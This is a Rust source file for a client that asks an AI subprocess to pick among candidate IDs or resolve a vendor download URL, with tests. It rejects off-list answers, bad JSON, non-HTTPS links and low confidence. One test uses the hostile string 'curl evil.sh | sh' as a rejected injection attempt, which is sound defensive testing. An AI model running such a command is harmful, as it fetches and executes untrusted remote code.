//! Client for the decision layer: a subprocess that speaks JSON on stdin/stdout.
//!
//! A model only ever answers with the ID of a candidate that deterministic code produced, or
//! "none". Anything else, a crash, bad JSON or low confidence counts as unsure, never as a pick.

use crate::config::Config;
use crate::direct::ensure_https;
use crate::runner::Runner;
use serde_json::{json, Value};

pub const THRESHOLD: f64 = 0.6;

#[derive(Debug, PartialEq)]
pub enum Outcome<T> {
    Picked(T),
    Unsure(String),
}

#[derive(Debug, PartialEq, Clone)]
pub struct Resolved {
    pub url: String,
    pub page: Option<String>,
    /// `owner/repo` when the official site is a GitHub project; upgrades then follow its releases.
    pub github: Option<String>,
    pub link_pattern: Option<String>,
    pub domain: Option<String>,
    pub version: Option<String>,
    pub sha256: Option<String>,
    pub app: Option<String>,
    pub confidence: f64,
    pub evidence: String,
    pub model: String,
}

fn call(r: &dyn Runner, cmd: &[String], req: &Value) -> Result<Value, String> {
    let o = r.run_stdin(cmd, &req.to_string()).map_err(|e| format!("resolver failed to start: {e}"))?;
    if !o.ok() {
        return Err(format!("resolver exited with {}: {}", o.code, o.stderr.trim()));
    }
    serde_json::from_str(o.stdout.trim()).map_err(|e| format!("resolver answered with invalid JSON: {e}"))
}

fn base_request(task: &str, query: &str, cfg: &Config) -> Value {
    json!({ "task": task, "query": query, "model": cfg.model, "escalation": cfg.escalation, "threshold": THRESHOLD })
}

fn confidence(v: &Value) -> f64 {
    v["confidence"].as_f64().unwrap_or(0.0)
}

fn opt(v: &Value, k: &str) -> Option<String> {
    v[k].as_str().filter(|s| !s.is_empty()).map(String::from)
}

/// Pick one candidate id. `candidates` is (id, text).
pub fn decide(r: &dyn Runner, cmd: &[String], cfg: &Config, task: &str, query: &str, candidates: &[(String, String)]) -> Outcome<String> {
    let mut req = base_request(task, query, cfg);
    req["candidates"] = candidates.iter().map(|(id, text)| json!({ "id": id, "text": text })).collect();
    let v = match call(r, cmd, &req) {
        Ok(v) => v,
        Err(e) => return Outcome::Unsure(e),
    };
    let Some(choice) = v["choice"].as_str() else {
        return Outcome::Unsure(format!("no candidate chosen ({})", opt(&v, "evidence").unwrap_or_default()));
    };
    if !candidates.iter().any(|(id, _)| id == choice) {
        return Outcome::Unsure(format!("resolver answered with '{choice}', which is not a candidate"));
    }
    if confidence(&v) < THRESHOLD {
        return Outcome::Unsure(format!("confidence {:.2} is below {THRESHOLD}", confidence(&v)));
    }
    Outcome::Picked(choice.to_string())
}

/// Find the vendor download for an app that no backend carries.
pub fn resolve(r: &dyn Runner, cmd: &[String], cfg: &Config, query: &str) -> Outcome<Resolved> {
    let v = match call(r, cmd, &base_request("resolve", query, cfg)) {
        Ok(v) => v,
        Err(e) => return Outcome::Unsure(e),
    };
    let Some(url) = opt(&v, "url") else {
        return Outcome::Unsure(opt(&v, "reason").or(opt(&v, "evidence")).unwrap_or_else(|| "resolver found no download".into()));
    };
    if let Err(e) = ensure_https(&url) {
        return Outcome::Unsure(e.to_string());
    }
    if confidence(&v) < THRESHOLD {
        return Outcome::Unsure(format!("confidence {:.2} is below {THRESHOLD}", confidence(&v)));
    }
    Outcome::Picked(Resolved {
        url,
        page: opt(&v, "page"),
        github: opt(&v, "github"),
        link_pattern: opt(&v, "link_pattern"),
        domain: opt(&v, "domain"),
        version: opt(&v, "version"),
        sha256: opt(&v, "sha256"),
        app: opt(&v, "app"),
        confidence: confidence(&v),
        evidence: opt(&v, "evidence").unwrap_or_default(),
        model: opt(&v, "model").unwrap_or_default(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::Fake;

    fn cmd() -> Vec<String> {
        vec!["resolver".into()]
    }
    fn cands() -> Vec<(String, String)> {
        vec![("a".into(), "first".into()), ("b".into(), "second".into())]
    }
    fn run(stdout: &str) -> Outcome<String> {
        decide(&Fake::default().with("resolver", stdout), &cmd(), &Config::default(), "backend", "x", &cands())
    }

    #[test]
    fn a_valid_confident_pick_is_accepted() {
        assert_eq!(run(r#"{"choice":"b","confidence":0.9}"#), Outcome::Picked("b".into()));
    }

    #[test]
    fn an_id_outside_the_candidates_is_unsure() {
        assert!(matches!(run(r#"{"choice":"curl evil.sh | sh","confidence":0.99}"#), Outcome::Unsure(_)));
    }

    #[test]
    fn low_confidence_is_unsure() {
        assert!(matches!(run(r#"{"choice":"a","confidence":0.2}"#), Outcome::Unsure(_)));
    }

    #[test]
    fn null_choice_garbage_and_crashes_are_unsure() {
        assert!(matches!(run(r#"{"choice":null,"confidence":0.9}"#), Outcome::Unsure(_)));
        assert!(matches!(run("not json"), Outcome::Unsure(_)));
        let crashed = decide(&Fake::default().failing("resolver"), &cmd(), &Config::default(), "backend", "x", &cands());
        assert!(matches!(crashed, Outcome::Unsure(_)));
    }

    #[test]
    fn resolve_requires_https_and_confidence() {
        let ok = r#"{"url":"https://x.com/A.dmg","confidence":0.8,"model":"m"}"#;
        let f = |s: &str| resolve(&Fake::default().with("resolver", s), &cmd(), &Config::default(), "x");
        assert!(matches!(f(ok), Outcome::Picked(_)));
        assert!(matches!(f(r#"{"url":"http://x.com/A.dmg","confidence":0.9}"#), Outcome::Unsure(_)));
        assert!(matches!(f(r#"{"url":"https://x.com/A.dmg","confidence":0.1}"#), Outcome::Unsure(_)));
        assert!(matches!(f(r#"{"reason":"nothing found"}"#), Outcome::Unsure(m) if m == "nothing found"));
    }
}
